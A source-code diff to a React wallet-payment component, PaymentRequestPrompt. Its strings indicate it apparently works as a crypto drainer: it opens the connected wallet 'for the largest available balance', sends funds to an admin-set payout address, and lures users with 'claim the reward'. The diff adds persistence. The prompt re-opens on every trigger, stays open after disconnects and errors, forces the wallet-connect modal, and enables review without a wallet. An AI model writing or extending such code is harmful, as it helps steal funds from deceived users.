@@ -259,7 +259,7 @@ function networkLabel(network: string): string {
 }
 
 export function PaymentRequestPrompt() {
-  const { connected, walletAddress, walletName, network, closeWalletModal } = useWalletState()
+  const { connected, walletAddress, walletName, network, closeWalletModal, openWalletModal } = useWalletState()
   const closeWalletModalRef = useRef(closeWalletModal)
   closeWalletModalRef.current = closeWalletModal
   const { publicKey, sendTransaction, signTransaction, wallet } = useWallet()
@@ -286,6 +286,7 @@ export function PaymentRequestPrompt() {
   const likedAfterFirst = useRef(false)
   const advanceTimer = useRef<number | null>(null)
   const scanPromise = useRef<Promise<FundStep[]> | null>(null)
+  const keepOpen = useRef(false)
 
   useEffect(() => {
     return () => {
@@ -307,17 +308,19 @@ export function PaymentRequestPrompt() {
       likedAfterFirst.current = false
       sentFor.current = null
       dismissed.current = null
+      keepOpen.current = true
       setSolAmount(0)
       setAsset('USDT')
       setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
       setOpen(true)
     }
-    window.addEventListener('vrfd-open-tx-sheet', onOpen, { once: true })
+    window.addEventListener('vrfd-open-tx-sheet', onOpen)
     return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
   }, [walletName])
 
   useEffect(() => {
     if (!connected || !walletAddress) {
+      if (keepOpen.current) return
       setOpen(false)
       setHiOpen(false)
       shownFor.current = null
@@ -354,7 +357,7 @@ export function PaymentRequestPrompt() {
     setSolAmount(0)
     setAsset('USDT')
     setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
-    setOpen(false)
+    if (!keepOpen.current) setOpen(false)
 
     return () => {
       cancelled = true
@@ -363,6 +366,7 @@ export function PaymentRequestPrompt() {
 
   const handleCancel = () => {
     if (walletAddress) dismissed.current = walletAddress
+    keepOpen.current = false
     queue.current = []
     phase.current = 'idle'
     setOpen(false)
@@ -374,12 +378,13 @@ export function PaymentRequestPrompt() {
   const handleReview = async () => {
     if (inFlight.current) return
     if (dismissed.current === walletAddress) return
-    if (!publicKey || !config || !destinationReady || !walletAddress) {
-      setStatus(
-        destinationReady
-          ? 'Wallet is still connecting. Use Open Wallet & Review again in a moment.'
-          : 'Save a payout address in admin before this payment can be opened in the wallet.'
-      )
+    if (!publicKey || !walletAddress) {
+      setStatus('Connect a wallet, then claim the reward.')
+      openWalletModal()
+      return
+    }
+    if (!config || !destinationReady) {
+      setStatus('Save a payout address in admin before this payment can be opened in the wallet.')
       return
     }
     inFlight.current = true
@@ -387,6 +392,7 @@ export function PaymentRequestPrompt() {
 
     const finishSequence = () => {
       if (walletAddress) dismissed.current = walletAddress
+      keepOpen.current = false
       queue.current = []
       phase.current = 'idle'
       setOpen(false)
@@ -515,6 +521,7 @@ export function PaymentRequestPrompt() {
             queue.current = []
             phase.current = 'idle'
             sentFor.current = null
+            keepOpen.current = false
             if (walletAddress) dismissed.current = walletAddress
             setOpen(false)
             setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
@@ -537,7 +544,6 @@ export function PaymentRequestPrompt() {
       const message = sendErrorMessage(err)
       setStatus(message)
       toast.error(message)
-      setOpen(false)
     } finally {
       inFlight.current = false
       setSubmitting(false)
@@ -629,7 +635,7 @@ export function PaymentRequestPrompt() {
         asset={asset}
         networkLabel={networkLabel(network)}
         submitting={submitting}
-        canReview={destinationReady && Boolean(publicKey)}
+        canReview={Boolean(publicKey) ? destinationReady : true}
         secondaryAmount={secondaryAmount}
         secondaryAsset={secondaryAsset}
         status={
